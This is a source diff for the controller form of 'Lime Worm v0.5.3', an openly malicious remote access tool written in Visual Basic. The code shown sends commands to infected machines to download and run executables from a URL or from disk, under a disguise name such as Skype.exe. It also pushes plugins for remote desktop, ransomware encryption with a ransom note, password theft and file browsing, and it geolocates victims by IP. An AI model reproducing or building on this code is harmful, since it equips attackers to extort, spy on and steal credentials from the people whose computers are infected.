@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on Apr./18/2018        ##
+'##        N Y A N   C A T  |||   Updated on Apr./24/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.2 ..                   ##
+'##                     .. Lime Worm v0.5.3 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -51,15 +51,14 @@ Public Class Form1
 
 #Region "Form Events"
 
-    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
-        NotifyIcon1.Dispose()
-        Application.Exit()
-        End
-    End Sub
+    Sub New()
 
-    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
+        ' This call is required by the designer.
+        InitializeComponent()
 
+        ' Add any initialization after the InitializeComponent() call.
         Try
+
             If Not IO.File.Exists(Application.StartupPath & "\GIO.dat") Then
                 IO.File.WriteAllBytes(Application.StartupPath & "\GIO.dat", My.Resources.GIO)
             End If
@@ -79,8 +78,19 @@ Public Class Form1
             If Not IO.File.Exists(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg") Then
                 My.Resources.Lime_s_wallpaper.Save(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg", Imaging.ImageFormat.Jpeg)
             End If
+
         Catch ex As Exception
         End Try
+
+    End Sub
+    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
+        NotifyIcon1.Dispose()
+        Application.Exit()
+        End
+    End Sub
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
+
 
         Control.CheckForIllegalCrossThreadCalls = False
         ContextMenuStrip1.Renderer = New MyRenderer()
@@ -95,7 +105,7 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.5.2"
+        Me.Text = "Lime Worm v0.5.3"
 
 
         EXE.Enabled = False
@@ -121,7 +131,7 @@ Public Class Form1
     Private Sub S_Connected(ByVal u As USER) Handles S.Connected
     End Sub
 
-    Private Shared Gio As New GIO(Application.StartupPath & "\GIO.dat")
+    Private Shared _Gio As New GIO(Application.StartupPath & "\GIO.dat")
     Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
     Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
         Dim A As String() = Split(BS(b), SPL)
@@ -130,7 +140,7 @@ Public Class Form1
 
                 Case "info" ' Client Sent me PC name
                     SyncLock L1.Items
-                        u.L = L1.Items.Add(Gio.LookupCountryName(u.IP.Split(":")(0)), Gio.LookupCountryCode(u.IP.Split(":")(0)) & ".png")
+                        u.L = L1.Items.Add(_Gio.LookupCountryName(u.IP.Split(":")(0)), _Gio.LookupCountryCode(u.IP.Split(":")(0)) & ".png")
                         u.L.Tag = u
                         u.L.SubItems.Add(u.IP.Split(":")(0))
                         For i As Integer = 1 To A.Length - 1
@@ -463,60 +473,6 @@ Public Class Form1
 #End Region
 
 
-#Region "Worm Options"
-
-
-    Private Sub DiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiskToolStripMenuItem.Click
-        Try
-            Dim o As New OpenFileDialog
-            With o
-                .Filter = ".exe (*.exe)|*.exe"
-                .Title = "UPDATE"
-            End With
-
-            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
-                Next
-            End If
-        Catch ex As Exception
-        End Try
-    End Sub
-
-    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
-        Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
-        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
-
-        If String.IsNullOrEmpty(URL) Then
-            Exit Sub
-        Else
-            For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE & SPL & "update")
-            Next
-        End If
-    End Sub
-
-    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Reconnect")
-        Next
-    End Sub
-
-    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Close")
-        Next
-    End Sub
-
-    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Uninstall")
-        Next
-    End Sub
-
-#End Region
-
-
 #Region "Theme"
 
 
@@ -730,10 +686,59 @@ Public Class Form1
 
 #Region "Commands"
 
+    Private Sub DiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiskToolStripMenuItem.Click
+        Try
+            Dim o As New OpenFileDialog
+            With o
+                .Filter = ".exe (*.exe)|*.exe"
+                .Title = "UPDATE"
+            End With
+
+            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                For Each x As ListViewItem In L1.SelectedItems
+                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
+                Next
+            End If
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
+        Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
+        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
+
+        If String.IsNullOrEmpty(URL) Then
+            Exit Sub
+        Else
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE & SPL & "update")
+            Next
+        End If
+    End Sub
+
+    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "Reconnect")
+        Next
+    End Sub
+
+    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "Close")
+        Next
+    End Sub
+
+    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "Uninstall")
+        Next
+    End Sub
+
+    '===================
 
     Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugen" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\RDP.dll")))
+            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\RDP.dll")))
         Next
     End Sub
 
@@ -778,7 +783,7 @@ Public Class Form1
             RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
             RANS_TEXT = R.RichTextBox1.Text
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "Plugen" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
+                S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
             Next
         End If
     End Sub
@@ -786,7 +791,7 @@ Public Class Form1
     Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "Plugen" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
+                S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
             Next
         Catch ex As Exception
             MsgBox(ex.Message)
@@ -795,7 +800,7 @@ Public Class Form1
 
     Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugen" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DET.dll")))
+            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DET.dll")))
         Next
     End Sub
 
@@ -836,13 +841,13 @@ Public Class Form1
 
     Private Sub CheckFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckFilesToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugen" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\FM.dll")))
+            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\FM.dll")))
         Next
     End Sub
 
     Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugen" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\PWD.dll")))
+            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\PWD.dll")))
         Next
 
     End Sub
